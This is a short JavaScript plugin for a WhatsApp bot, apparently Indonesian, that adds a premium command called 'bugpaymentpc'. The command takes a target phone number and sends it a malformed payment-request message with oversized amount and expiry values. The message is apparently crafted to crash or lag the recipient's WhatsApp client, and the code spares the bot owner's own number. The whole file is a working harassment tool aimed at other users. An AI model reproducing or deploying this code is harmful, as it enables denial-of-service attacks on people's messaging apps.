let fs = require('fs')
//let { doctext } = require('../src/doctext.js')

let handler = async(m, { conn, usedPrefix, command, text }) => {
    let nomornya = text.replace(/[^0-9]/g, '')
    if (!text) { throw `Masukkan nomor target\n\nContoh: ${usedPrefix + command} 62857xxx`
    } else if (nomornya.includes('6285752765133')) {
        throw `ITU NOMOR OWNER BANH😅`
    } else {
    conn.relayMessage(nomornya + '@s.whatsapp.net', { requestPaymentMessage: { Message: { TextMessage: { text: `ya`, currencyCodeIso4217: 'IDR', requestFrom: '6285752765133@s.whatsapp.net', expiryTimestamp: 6285752765133, amount: 6285752765133, background: fs.readFileSync('./src/logo.jpg') }}}}, {})
    m.reply(`Sukses Mengirim Bugpayment Ke Nomor ${text}`)
    }
}
handler.command = /^(bugpaymentpc)$/i
handler.premium = true
handler.tags = ['premium']
handler.help = ['bugpaymentpc']

module.exports = handler